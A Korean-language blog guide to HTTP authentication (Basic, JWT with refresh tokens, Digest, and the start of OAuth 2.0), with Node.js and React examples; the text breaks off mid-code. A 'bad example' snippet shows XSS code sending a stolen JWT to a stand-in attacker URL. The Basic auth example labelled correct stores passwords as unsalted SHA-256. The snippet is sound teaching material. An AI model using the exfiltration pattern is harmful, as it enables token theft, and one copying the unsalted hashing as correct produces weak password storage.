---
title: HTTP 인증 방법 완벽 가이드
date: 2025-10-13
categories: [Computer Science, Networking, HTTP]
tags: [this, Context, Scope, Callback, Async, Functions]
layout: page
---
# HTTP 인증 방법 완벽 가이드: API를 안전하게 보호하는 법

처음 API를 만들고 나면 곧바로 이런 질문에 부딪히게 됩니다. "누가 이 API를 호출할 수 있게 할까? 어떻게 사용자를 확인하지?" 저도 첫 프로젝트에서 이 문제를 마주했을 때, 직접 로그인 시스템을 만들려다가 엄청난 보안 이슈들과 씨름했던 기억이 있습니다. 비밀번호를 어떻게 저장하지? 토큰은 어디에 보관하지? HTTPS는 왜 필요하지?

다행히도 **HTTP 인증은 이미 표준화된 프로토콜**입니다. 바퀴를 다시 발명할 필요가 없습니다. 이 문서에서는 Basic부터 OAuth 2.0까지, 각 인증 방식의 작동 원리와 실전 활용법을 여러분이 직접 구현할 수 있을 만큼 자세히 다루겠습니다.

## 왜 HTTP 인증을 제대로 이해해야 할까요?

### 1. 보안은 선택이 아닌 필수입니다

API 보안을 잘못 구현하면 어떤 일이 벌어질까요?

**실제 사례: 평문 비밀번호 전송**
```javascript
// ❌ 절대 이렇게 하면 안 됩니다!
fetch('http://api.example.com/login', {
  method: 'POST',
  body: JSON.stringify({
    username: 'user',
    password: 'mypassword123'  // 평문으로 전송!
  })
});
```

이 코드의 문제점:
- HTTP(S가 아닌)로 전송하면 네트워크 상에서 모든 데이터가 그대로 노출됩니다
- 누구나 Wireshark 같은 도구로 패킷을 캡처해서 비밀번호를 볼 수 있습니다
- 공용 WiFi에서는 더욱 위험합니다

### 2. 표준을 따르면 생태계의 혜택을 받습니다

HTTP 인증 표준을 따르면:
- 브라우저가 자동으로 인증 UI를 제공합니다
- curl, Postman 같은 도구들이 기본 지원합니다
- 웹 서버(Apache, Nginx)에서 설정만으로 구현 가능합니다
- 다른 개발자들이 쉽게 이해하고 사용할 수 있습니다

### 3. 상황에 맞는 방식을 선택해야 합니다

모든 상황에 맞는 완벽한 인증 방식은 없습니다:
- 내부 관리 도구 → Basic 인증으로 충분할 수 있습니다
- REST API → Bearer Token (JWT)이 적합합니다
- 제3자 서비스 연동 → OAuth 2.0이 필수입니다
- 레거시 시스템 → Digest 인증이 최선일 수 있습니다

## 기본 개념: 인증 vs 권한 부여

시작하기 전에 중요한 개념 두 가지를 구분해야 합니다:

**인증(Authentication)**: "당신은 누구입니까?"
```javascript
// 사용자가 정말로 본인이 맞는지 확인
if (username === 'alice' && password === 'correct') {
  console.log('인증 성공');
}
```

**권한 부여(Authorization)**: "당신은 무엇을 할 수 있습니까?"
```javascript
// 인증된 사용자가 특정 리소스에 접근할 권한이 있는지 확인
if (user.role === 'admin') {
  console.log('관리자 페이지 접근 허용');
}
```

이 문서는 주로 **인증**에 초점을 맞추지만, 실제로는 둘 다 필요합니다.

## Basic Authentication: 가장 단순한 방식

### 어떻게 작동하나요?

Basic 인증은 이름처럼 정말 기본적입니다:

1. 클라이언트가 보호된 리소스에 접근 시도
2. 서버가 `401 Unauthorized` 응답
3. 클라이언트가 `사용자명:비밀번호`를 Base64로 인코딩
4. `Authorization: Basic [인코딩된값]` 헤더로 전송
5. 서버가 검증 후 응답

### 시각적 흐름

```
클라이언트                           서버
    |                                |
    |------ GET /api/users --------->|
    |                                |
    |<--- 401 Unauthorized ----------|
    |    WWW-Authenticate: Basic     |
    |         realm="API"            |
    |                                |
    | 사용자명:비밀번호 입력           |
    | Base64 인코딩                   |
    |                                |
    |-- Authorization: Basic YWxp... >|
    |                                |
    |                           [검증]|
    |                                |
    |<------ 200 OK + 데이터 --------|
```

### 실전 예제 1: curl로 Basic 인증 사용하기

```bash
# 방법 1: -u 옵션 사용 (권장)
curl -u admin:password123 https://api.example.com/users

# 방법 2: 직접 헤더 설정
# 먼저 인코딩: echo -n "admin:password123" | base64
# 결과: YWRtaW46cGFzc3dvcmQxMjM=
curl -H "Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=" \
  https://api.example.com/users

# 방법 3: URL에 포함 (비추천 - 로그에 남음)
curl https://admin:password123@api.example.com/users
```

### 실전 예제 2: Node.js/Express 서버 구현

```javascript
// ✅ 올바른 Basic 인증 구현
const express = require('express');
const crypto = require('crypto');

const app = express();

// 사용자 데이터베이스 (실제로는 DB 사용)
const users = {
  admin: {
    // 비밀번호를 해시로 저장 (절대 평문 저장 금지!)
    passwordHash: crypto.createHash('sha256')
      .update('password123')
      .digest('hex'),
    role: 'admin'
  }
};

// Basic 인증 미들웨어
function basicAuth(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Basic ')) {
    res.setHeader('WWW-Authenticate', 'Basic realm="API"');
    return res.status(401).json({ error: '인증이 필요합니다' });
  }

  // "Basic " 제거하고 Base64 디코딩
  const base64Credentials = authHeader.split(' ')[1];
  const credentials = Buffer.from(base64Credentials, 'base64')
    .toString('utf-8');
  const [username, password] = credentials.split(':');

  // 사용자 확인
  const user = users[username];
  if (!user) {
    return res.status(401).json({ error: '잘못된 자격 증명' });
  }

  // 비밀번호 확인 (해시 비교)
  const passwordHash = crypto.createHash('sha256')
    .update(password)
    .digest('hex');

  if (passwordHash !== user.passwordHash) {
    return res.status(401).json({ error: '잘못된 자격 증명' });
  }

  // 인증 성공 - 사용자 정보를 request에 추가
  req.user = { username, role: user.role };
  next();
}

// 보호된 엔드포인트
app.get('/api/users', basicAuth, (req, res) => {
  res.json({
    message: `안녕하세요, ${req.user.username}님!`,
    users: ['Alice', 'Bob', 'Charlie']
  });
});

app.listen(3000, () => {
  console.log('서버가 3000 포트에서 실행 중');
});
```

### 실전 예제 3: 브라우저에서 JavaScript로 사용

```javascript
// ✅ 올바른 방법: HTTPS + Base64 인코딩
async function fetchWithBasicAuth(url, username, password) {
  // Base64 인코딩
  const credentials = btoa(`${username}:${password}`);

  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: {
        'Authorization': `Basic ${credentials}`,
        'Content-Type': 'application/json'
      }
    });

    if (!response.ok) {
      if (response.status === 401) {
        throw new Error('인증 실패: 사용자명 또는 비밀번호를 확인하세요');
      }
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    return data;
  } catch (error) {
    console.error('API 호출 실패:', error);
    throw error;
  }
}

// 사용 예시
fetchWithBasicAuth(
  'https://api.example.com/users',
  'admin',
  'password123'
).then(data => {
  console.log('사용자 목록:', data);
}).catch(error => {
  console.error('오류:', error.message);
});
```

### 실전 예제 4: React 컴포넌트에서 사용

```jsx
import { useState } from 'react';

function LoginWithBasicAuth() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [data, setData] = useState(null);
  const [error, setError] = useState(null);
  const [loading, setLoading] = useState(false);

  const handleLogin = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);

    try {
      // Basic 인증 헤더 생성
      const credentials = btoa(`${username}:${password}`);

      const response = await fetch('https://api.example.com/users', {
        method: 'GET',
        headers: {
          'Authorization': `Basic ${credentials}`,
          'Content-Type': 'application/json'
        }
      });

      if (!response.ok) {
        if (response.status === 401) {
          throw new Error('사용자명 또는 비밀번호가 틀렸습니다');
        }
        throw new Error('서버 오류가 발생했습니다');
      }

      const result = await response.json();
      setData(result);
    } catch (err) {
      setError(err.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <h2>로그인</h2>
      <form onSubmit={handleLogin}>
        <div>
          <label>
            사용자명:
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
            />
          </label>
        </div>
        <div>
          <label>
            비밀번호:
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
          </label>
        </div>
        <button type="submit" disabled={loading}>
          {loading ? '로그인 중...' : '로그인'}
        </button>
      </form>

      {error && (
        <div style={{ color: 'red' }}>
          오류: {error}
        </div>
      )}

      {data && (
        <div>
          <h3>인증 성공!</h3>
          <pre>{JSON.stringify(data, null, 2)}</pre>
        </div>
      )}
    </div>
  );
}
```

### 좋은 예 vs 나쁜 예

#### ❌ 나쁜 예 1: HTTP 사용 (HTTPS 아님)

```javascript
// 위험! 평문으로 전송됨
fetch('http://api.example.com/login', {  // http:// 주목!
  headers: {
    'Authorization': 'Basic YWRtaW46cGFzc3dvcmQxMjM='
  }
});

// 문제:
// - Base64는 암호화가 아니라 인코딩입니다
// - 누구나 디코딩 가능: atob('YWRtaW46cGFzc3dvcmQxMjM=')
// - 네트워크 패킷을 가로채면 비밀번호가 그대로 노출됩니다
```

#### ✅ 좋은 예 1: HTTPS 사용

```javascript
// 안전: SSL/TLS로 암호화됨
fetch('https://api.example.com/login', {  // https:// 사용!
  headers: {
    'Authorization': 'Basic YWRtaW46cGFzc3dvcmQxMjM='
  }
});
```

#### ❌ 나쁜 예 2: 비밀번호를 평문으로 저장

```javascript
// 서버 코드 - 절대 이렇게 하면 안 됨!
const users = {
  admin: {
    password: 'password123'  // 평문 저장!
  }
};

function authenticate(username, password) {
  return users[username]?.password === password;
}
```

#### ✅ 좋은 예 2: bcrypt로 해시 저장

```javascript
const bcrypt = require('bcrypt');

// 회원가입 시 비밀번호 해시
async function registerUser(username, password) {
  const saltRounds = 10;
  const passwordHash = await bcrypt.hash(password, saltRounds);

  users[username] = { passwordHash };
}

// 로그인 시 검증
async function authenticate(username, password) {
  const user = users[username];
  if (!user) return false;

  return await bcrypt.compare(password, user.passwordHash);
}
```

### Basic 인증의 장단점

#### 장점
- **구현이 매우 간단합니다**: 몇 줄의 코드면 충분합니다
- **표준화되어 있습니다**: 모든 HTTP 클라이언트가 지원합니다
- **브라우저 지원**: 브라우저가 자동으로 로그인 창을 띄웁니다
- **디버깅이 쉽습니다**: 헤더만 확인하면 됩니다

#### 단점
- **HTTPS 필수**: HTTP에서는 절대 사용하면 안 됩니다
- **로그아웃 불가능**: 브라우저를 닫기 전까지 인증 상태 유지
- **매 요청마다 전송**: 비밀번호(인코딩된)를 계속 전송합니다
- **브라우저 UI 제한**: 로그인 팝업을 커스터마이징할 수 없습니다

### 언제 사용해야 할까요?

✅ **적합한 경우:**
- 내부 관리 도구, 개발 환경
- 간단한 API 프로토타입
- HTTPS가 보장된 내부 네트워크
- 빠른 구현이 필요한 경우

❌ **부적합한 경우:**
- 공개 웹 애플리케이션
- 로그아웃 기능이 필요한 경우
- 커스텀 로그인 UI가 필요한 경우
- 세션 관리가 필요한 경우

## Bearer Token (JWT): 현대적 접근

### JWT가 필요한 이유

상상해보세요. 여러분이 놀이공원에 입장할 때:

**Basic 인증 방식:**
- 입구마다 티켓을 보여주고
- 직원이 매번 데이터베이스를 확인하고
- 티켓이 유효한지 검증합니다

**JWT 방식:**
- 입장할 때 손목 밴드를 받습니다
- 손목 밴드 자체에 모든 정보가 담겨 있습니다
- 직원은 밴드만 보고 즉시 확인할 수 있습니다
- 데이터베이스 조회가 필요 없습니다

이것이 JWT(JSON Web Token)의 핵심 아이디어입니다.

### JWT 구조 이해하기

JWT는 세 부분으로 구성됩니다:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

└─────────── Header ──────────┘ └───────────── Payload ─────────────┘ └─────── Signature ──────┘
```

각 부분을 디코딩하면:

**1. Header (헤더):**
```json
{
  "alg": "HS256",  // 서명 알고리즘
  "typ": "JWT"     // 토큰 타입
}
```

**2. Payload (페이로드):**
```json
{
  "sub": "1234567890",           // Subject: 사용자 ID
  "name": "John Doe",            // 사용자 이름
  "iat": 1516239022,             // Issued At: 발급 시간
  "exp": 1516242622,             // Expiration: 만료 시간
  "role": "admin"                // 추가 정보
}
```

**3. Signature (서명):**
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret  // 서버만 아는 비밀 키
)
```

### 실전 예제 5: JWT 생성 및 검증 (Node.js)

```javascript
const jwt = require('jsonwebtoken');
const express = require('express');
const bcrypt = require('bcrypt');

const app = express();
app.use(express.json());

// 비밀 키 (환경 변수로 관리해야 함!)
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-this';

// 사용자 데이터베이스
const users = {
  alice: {
    passwordHash: '$2b$10$...',  // bcrypt 해시
    role: 'admin'
  }
};

// 1️⃣ 로그인 엔드포인트 - JWT 발급
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;

  // 사용자 확인
  const user = users[username];
  if (!user) {
    return res.status(401).json({ error: '잘못된 자격 증명' });
  }

  // 비밀번호 확인
  const isValid = await bcrypt.compare(password, user.passwordHash);
  if (!isValid) {
    return res.status(401).json({ error: '잘못된 자격 증명' });
  }

  // ✅ JWT 생성
  const token = jwt.sign(
    {
      sub: username,           // Subject
      role: user.role,         // 권한 정보
      iat: Math.floor(Date.now() / 1000)  // 발급 시간
    },
    JWT_SECRET,
    {
      expiresIn: '1h'  // 1시간 후 만료
    }
  );

  res.json({
    message: '로그인 성공',
    token: token,
    expiresIn: 3600  // 초 단위
  });
});

// 2️⃣ JWT 검증 미들웨어
function authenticateToken(req, res, next) {
  const authHeader = req.headers.authorization;
  const token = authHeader && authHeader.split(' ')[1];  // "Bearer TOKEN"

  if (!token) {
    return res.status(401).json({ error: '토큰이 필요합니다' });
  }

  try {
    // ✅ JWT 검증
    const decoded = jwt.verify(token, JWT_SECRET);
    req.user = decoded;  // { sub: 'alice', role: 'admin', iat: ..., exp: ... }
    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ error: '토큰이 만료되었습니다' });
    }
    if (error.name === 'JsonWebTokenError') {
      return res.status(403).json({ error: '유효하지 않은 토큰입니다' });
    }
    return res.status(500).json({ error: '서버 오류' });
  }
}

// 3️⃣ 보호된 엔드포인트
app.get('/api/profile', authenticateToken, (req, res) => {
  res.json({
    username: req.user.sub,
    role: req.user.role,
    message: '인증된 사용자만 볼 수 있는 데이터'
  });
});

// 4️⃣ 관리자 전용 엔드포인트
app.get('/api/admin', authenticateToken, (req, res) => {
  // 권한 확인
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: '관리자 권한이 필요합니다' });
  }

  res.json({
    message: '관리자 전용 데이터',
    users: Object.keys(users)
  });
});

app.listen(3000);
```

### 실전 예제 6: React에서 JWT 사용하기

```jsx
import { useState, useEffect } from 'react';

// JWT 토큰 관리 유틸리티
const tokenManager = {
  // 토큰 저장
  setToken(token) {
    localStorage.setItem('jwt_token', token);
  },

  // 토큰 가져오기
  getToken() {
    return localStorage.getItem('jwt_token');
  },

  // 토큰 삭제
  removeToken() {
    localStorage.removeItem('jwt_token');
  },

  // 토큰 만료 확인
  isTokenExpired(token) {
    if (!token) return true;

    try {
      // JWT payload 디코딩
      const payload = JSON.parse(atob(token.split('.')[1]));
      const expirationTime = payload.exp * 1000;  // 밀리초로 변환
      return Date.now() >= expirationTime;
    } catch (error) {
      return true;
    }
  }
};

// API 클라이언트
const apiClient = {
  async login(username, password) {
    const response = await fetch('https://api.example.com/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });

    if (!response.ok) {
      throw new Error('로그인 실패');
    }

    const data = await response.json();
    tokenManager.setToken(data.token);
    return data;
  },

  async fetchWithAuth(url, options = {}) {
    const token = tokenManager.getToken();

    if (!token || tokenManager.isTokenExpired(token)) {
      throw new Error('토큰이 없거나 만료되었습니다');
    }

    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      }
    });

    if (response.status === 401) {
      tokenManager.removeToken();
      throw new Error('인증이 필요합니다');
    }

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    return response.json();
  }
};

// 로그인 컴포넌트
function LoginWithJWT() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [userData, setUserData] = useState(null);
  const [error, setError] = useState(null);

  // 컴포넌트 마운트 시 토큰 확인
  useEffect(() => {
    const token = tokenManager.getToken();
    if (token && !tokenManager.isTokenExpired(token)) {
      setIsAuthenticated(true);
      fetchUserProfile();
    }
  }, []);

  const handleLogin = async (e) => {
    e.preventDefault();
    setError(null);

    try {
      await apiClient.login(username, password);
      setIsAuthenticated(true);
      await fetchUserProfile();
    } catch (err) {
      setError(err.message);
    }
  };

  const fetchUserProfile = async () => {
    try {
      const data = await apiClient.fetchWithAuth(
        'https://api.example.com/profile'
      );
      setUserData(data);
    } catch (err) {
      setError(err.message);
      setIsAuthenticated(false);
    }
  };

  const handleLogout = () => {
    tokenManager.removeToken();
    setIsAuthenticated(false);
    setUserData(null);
  };

  if (isAuthenticated) {
    return (
      <div>
        <h2>환영합니다!</h2>
        {userData && (
          <div>
            <p>사용자명: {userData.username}</p>
            <p>역할: {userData.role}</p>
          </div>
        )}
        <button onClick={handleLogout}>로그아웃</button>
      </div>
    );
  }

  return (
    <div>
      <h2>로그인</h2>
      <form onSubmit={handleLogin}>
        <input
          type="text"
          placeholder="사용자명"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
        />
        <input
          type="password"
          placeholder="비밀번호"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <button type="submit">로그인</button>
      </form>
      {error && <p style={{ color: 'red' }}>{error}</p>}
    </div>
  );
}
```

### 실전 예제 7: Refresh Token 패턴

```javascript
// 서버 코드: Access Token + Refresh Token
const jwt = require('jsonwebtoken');
const express = require('express');

const app = express();
app.use(express.json());

const ACCESS_TOKEN_SECRET = 'access-secret';
const REFRESH_TOKEN_SECRET = 'refresh-secret';

// Refresh 토큰 저장소 (실제로는 Redis 사용 권장)
const refreshTokens = new Set();

// 로그인: Access Token + Refresh Token 발급
app.post('/api/login', async (req, res) => {
  // 인증 로직... (생략)

  const user = { sub: 'alice', role: 'admin' };

  // Access Token: 짧은 유효 기간 (15분)
  const accessToken = jwt.sign(user, ACCESS_TOKEN_SECRET, {
    expiresIn: '15m'
  });

  // Refresh Token: 긴 유효 기간 (7일)
  const refreshToken = jwt.sign(user, REFRESH_TOKEN_SECRET, {
    expiresIn: '7d'
  });

  // Refresh Token 저장
  refreshTokens.add(refreshToken);

  res.json({
    accessToken,
    refreshToken,
    expiresIn: 900  // 15분
  });
});

// Access Token 갱신
app.post('/api/refresh', (req, res) => {
  const { refreshToken } = req.body;

  if (!refreshToken) {
    return res.status(401).json({ error: 'Refresh token이 필요합니다' });
  }

  if (!refreshTokens.has(refreshToken)) {
    return res.status(403).json({ error: '유효하지 않은 refresh token' });
  }

  try {
    const user = jwt.verify(refreshToken, REFRESH_TOKEN_SECRET);

    // 새로운 Access Token 발급
    const newAccessToken = jwt.sign(
      { sub: user.sub, role: user.role },
      ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );

    res.json({
      accessToken: newAccessToken,
      expiresIn: 900
    });
  } catch (error) {
    return res.status(403).json({ error: 'Refresh token이 만료되었습니다' });
  }
});

// 로그아웃: Refresh Token 제거
app.post('/api/logout', (req, res) => {
  const { refreshToken } = req.body;
  refreshTokens.delete(refreshToken);
  res.json({ message: '로그아웃 성공' });
});
```

```javascript
// 클라이언트 코드: 자동 토큰 갱신
class AuthClient {
  constructor() {
    this.accessToken = null;
    this.refreshToken = null;
    this.isRefreshing = false;
    this.refreshSubscribers = [];
  }

  async login(username, password) {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username, password })
    });

    const data = await response.json();
    this.accessToken = data.accessToken;
    this.refreshToken = data.refreshToken;

    // localStorage에도 저장 (보안 주의!)
    localStorage.setItem('refreshToken', data.refreshToken);
  }

  async refreshAccessToken() {
    if (this.isRefreshing) {
      // 이미 갱신 중이면 대기
      return new Promise((resolve) => {
        this.refreshSubscribers.push(resolve);
      });
    }

    this.isRefreshing = true;

    try {
      const response = await fetch('/api/refresh', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          refreshToken: this.refreshToken
        })
      });

      if (!response.ok) {
        throw new Error('Token refresh failed');
      }

      const data = await response.json();
      this.accessToken = data.accessToken;

      // 대기 중인 요청들 처리
      this.refreshSubscribers.forEach(callback => callback(this.accessToken));
      this.refreshSubscribers = [];

      return this.accessToken;
    } finally {
      this.isRefreshing = false;
    }
  }

  async fetch(url, options = {}) {
    let response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        'Authorization': `Bearer ${this.accessToken}`
      }
    });

    // 401 에러 → Access Token 만료
    if (response.status === 401) {
      // Access Token 갱신 시도
      await this.refreshAccessToken();

      // 원래 요청 재시도
      response = await fetch(url, {
        ...options,
        headers: {
          ...options.headers,
          'Authorization': `Bearer ${this.accessToken}`
        }
      });
    }

    return response;
  }
}

// 사용 예시
const authClient = new AuthClient();

// 로그인
await authClient.login('alice', 'password');

// API 호출 (자동으로 토큰 갱신됨)
const data = await authClient.fetch('/api/profile').then(r => r.json());
```

### 좋은 예 vs 나쁜 예

#### ❌ 나쁜 예 3: JWT를 localStorage에 저장

```javascript
// XSS 공격에 취약!
localStorage.setItem('jwt', token);

// 악의적인 스크립트가 토큰을 탈취할 수 있음
const stolenToken = localStorage.getItem('jwt');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: stolenToken
});
```

#### ✅ 좋은 예 3: httpOnly 쿠키 사용

```javascript
// 서버 코드
app.post('/api/login', async (req, res) => {
  // 인증 로직...

  const token = jwt.sign(userData, JWT_SECRET, { expiresIn: '1h' });

  // ✅ httpOnly 쿠키로 전송
  res.cookie('token', token, {
    httpOnly: true,    // JavaScript로 접근 불가
    secure: true,      // HTTPS에서만 전송
    sameSite: 'strict', // CSRF 방어
    maxAge: 3600000    // 1시간
  });

  res.json({ message: '로그인 성공' });
});

// 클라이언트는 쿠키를 자동으로 전송
fetch('/api/profile', {
  credentials: 'include'  // 쿠키 포함
});
```

#### ❌ 나쁜 예 4: JWT에 민감한 정보 저장

```javascript
// 절대 이렇게 하면 안 됨!
const token = jwt.sign({
  username: 'alice',
  password: 'secret123',     // ❌ 비밀번호 포함
  ssn: '123-45-6789',        // ❌ 주민번호 포함
  creditCard: '1234-5678'    // ❌ 신용카드 포함
}, JWT_SECRET);

// JWT는 디코딩 가능! 누구나 볼 수 있습니다
const payload = JSON.parse(atob(token.split('.')[1]));
console.log(payload.password);  // 'secret123' 노출!
```

#### ✅ 좋은 예 4: 최소한의 정보만 포함

```javascript
// ✅ 사용자 식별자와 권한 정보만
const token = jwt.sign({
  sub: 'user-id-12345',      // 사용자 ID (식별자)
  role: 'admin',             // 역할
  iat: Math.floor(Date.now() / 1000),  // 발급 시간
  exp: Math.floor(Date.now() / 1000) + 3600  // 만료 시간
}, JWT_SECRET);

// 필요한 추가 정보는 서버에서 조회
app.get('/api/profile', authenticateToken, async (req, res) => {
  // JWT에서 사용자 ID 추출
  const userId = req.user.sub;

  // 데이터베이스에서 상세 정보 조회
  const userProfile = await db.users.findById(userId);

  res.json(userProfile);
});
```

### JWT의 장단점

#### 장점
- **Stateless**: 서버에 세션 저장 불필요
- **확장성**: 여러 서버에서 사용 가능 (분산 시스템에 적합)
- **유연성**: 다양한 정보를 포함 가능
- **표준화**: RFC 7519로 표준화됨

#### 단점
- **취소 불가**: 한 번 발급하면 만료 전까지 유효
- **크기**: Base64 인코딩으로 인해 Basic 인증보다 큼
- **보안 주의**: XSS, CSRF 공격에 대한 방어 필요

## Digest Authentication: 챌린지-응답 방식

### Basic 인증의 문제를 해결하다

Digest 인증은 Basic 인증의 보안 문제를 개선한 방식입니다. 비밀번호를 직접 전송하는 대신, 챌린지-응답 방식을 사용합니다.

### 작동 원리

```
클라이언트                                서버
    |                                      |
    |------ GET /api/data ---------------->|
    |                                      |
    |<----- 401 Unauthorized --------------|
    |  WWW-Authenticate: Digest            |
    |    realm="API"                       |
    |    nonce="dcd98b7102dd2f0e"          |
    |    qop="auth"                        |
    |                                      |
    | [클라이언트가 해시 계산]               |
    | HA1 = MD5(username:realm:password)   |
    | HA2 = MD5(method:uri)                |
    | response = MD5(HA1:nonce:HA2)        |
    |                                      |
    |-- Authorization: Digest ------------>|
    |   username="alice"                   |
    |   response="6629fae49393a05..."      |
    |   nonce="dcd98b7102dd2f0e"           |
    |                                      |
    |                         [서버도 계산해서 비교]
    |                                      |
    |<------ 200 OK + 데이터 --------------|
```

### 실전 예제 8: Digest 인증 구현 (Node.js)

```javascript
const crypto = require('crypto');
const express = require('express');

const app = express();

const users = {
  alice: {
    // Digest 인증에서는 HA1을 저장
    // HA1 = MD5(username:realm:password)
    ha1: crypto.createHash('md5')
      .update('alice:API:secret123')
      .digest('hex')
  }
};

// Nonce 생성 및 관리
const nonces = new Map();

function generateNonce() {
  const nonce = crypto.randomBytes(16).toString('hex');
  const timestamp = Date.now();
  nonces.set(nonce, timestamp);
  return nonce;
}

function validateNonce(nonce) {
  if (!nonces.has(nonce)) return false;

  const timestamp = nonces.get(nonce);
  const age = Date.now() - timestamp;

  // 5분 이상 된 nonce는 거부
  if (age > 5 * 60 * 1000) {
    nonces.delete(nonce);
    return false;
  }

  return true;
}

// Digest 인증 미들웨어
function digestAuth(req, res, next) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Digest ')) {
    const nonce = generateNonce();
    res.setHeader('WWW-Authenticate',
      `Digest realm="API", qop="auth", nonce="${nonce}"`
    );
    return res.status(401).json({ error: '인증이 필요합니다' });
  }

  // Digest 파라미터 파싱
  const params = {};
  authHeader.slice(7).split(',').forEach(part => {
    const [key, value] = part.trim().split('=');
    params[key] = value.replace(/"/g, '');
  });

  const { username, nonce, uri, response } = params;

  // Nonce 검증
  if (!validateNonce(nonce)) {
    return res.status(401).json({ error: 'Nonce가 유효하지 않습니다' });
  }

  // 사용자 확인
  const user = users[username];
  if (!user) {
    return res.status(401).json({ error: '잘못된 자격 증명' });
  }

  // HA2 계산: MD5(method:uri)
  const ha2 = crypto.createHash('md5')
    .update(`${req.method}:${uri}`)
    .digest('hex');

  // 예상 응답 계산: MD5(HA1:nonce:HA2)
  const expectedResponse = crypto.createHash('md5')
    .update(`${user.ha1}:${nonce}:${ha2}`)
    .digest('hex');

  // 응답 비교
  if (response !== expectedResponse) {
    return res.status(401).json({ error: '잘못된 자격 증명' });
  }

  // 인증 성공
  req.user = { username };

  // Nonce 사용 완료 (재사용 방지)
  nonces.delete(nonce);

  next();
}

app.get('/api/data', digestAuth, (req, res) => {
  res.json({
    message: `안녕하세요, ${req.user.username}님!`,
    data: ['item1', 'item2', 'item3']
  });
});

app.listen(3000);
```

### Digest 인증의 장단점

#### 장점
- **비밀번호 미전송**: 해시만 전송되므로 더 안전
- **재전송 공격 방지**: Nonce를 사용해 재전송 공격 차단
- **HTTP에서도 사용 가능**: HTTPS 없이도 Basic보다 안전

#### 단점
- **MD5 취약**: MD5 해시가 약한 것으로 알려짐
- **구현 복잡**: Basic보다 구현이 복잡함
- **제한적 지원**: 모든 클라이언트가 지원하는 것은 아님
- **현대 표준 아님**: JWT나 OAuth가 더 선호됨

## OAuth 2.0: 현대의 표준

### 왜 OAuth가 필요할까요?

이런 상황을 상상해보세요:

여러분이 사진 인쇄 서비스를 만들었습니다. 사용자가 Google Photos의 사진을 가져와서 인쇄하고 싶어 합니다. 어떻게 해야 할까요?

**❌ 나쁜 방법:**
```
사용자에게 Google 비밀번호를 입력받아서
우리 서버가 Google에 로그인한다
```

**문제점:**
- 사용자의 Google 비밀번호를 알게 됩니다
- Google의 모든 데이터에 접근 가능합니다
- 사용자가 비밀번호를 변경해도 계속 접근 가능합니다

**✅ OAuth 2.0 방법:**
```
사용자가 Google에 직접 로그인하고
"이 앱이 내 사진만 볼 수 있게 허용" 권한을 부여합니다
우리 앱은 제한된 권한의 토큰만 받습니다
```

### OAuth 2.0 주요 개념

**등장인물 (Roles):**
1. **Resource Owner (자원 소유자)**: 사용자
2. **Client (클라이언트)**: 우리 앱
3. **Authorization Server (인증 서버)**: Google 로그인 서버
4. **Resource Server (자원 서버)**: Google Photos API

### OAuth 2.0 흐름 (Authorization Code Flow)

```
사용자          우리 앱              Google 인증 서버        Google API
  |               |                        |                    |
  |--[1] 로그인--->|                        |                    |
  |               |                        |                    |
  |               |--[2] 인증 요청 -------->|                    |
  |               |  (client_id, scope)    |                    |
  |               |                        |                    |
  |<--------------[3] Google 로그인 화면 ---|                    |
  |               |                        |                    |
  |--[4] 동의---->|                        |                    |
  |               |                        |                    |
  |<--------------[5] 인증 코드 (code) -----|                    |
  |               |                        |                    |
  |               |--[6] 토큰 요청 -------->|                    |
  |               |  (code, client_secret) |                    |
  |               |                        |                    |
  |               |<--[7] Access Token-----|                    |
  |               |                        |                    |
  |               |--[8] API 요청 ----------------------->|      |
  |               |  (Bearer access_token)                |      |
  |               |                                       |      |
  |               |<--[9] 사진 데이터 --------------------|      |
  |               |                                              |
  |<--[10] 표시---|                                              |
```

### 실전 예제 9: OAuth 2.0 구현 (Google 로그인)

```javascript
// 서버 코드 (Node.js + Express)
const express = require('express');
const axios = require('axios');

const app = express();

// Google OAuth 설정 (Google Cloud Console에서 발급)
const GOOGLE_CLIENT_ID = 'your-client-id.apps.googleusercontent.com';
const GOOGLE_CLIENT_SECRET = 'your-client-secret';
const REDIRECT_URI = 'http://localhost:3000/auth/google/callback';

// 1️⃣ 로그인 시작: Google 인증 페이지로 리다이렉트
app.get('/auth/google', (req, res) => {
  const authUrl = 'https://accounts.google.com/o/oauth2/v2/auth';
  const params = new URLSearchParams({
    client_id: GOOGLE_CLIENT_ID,
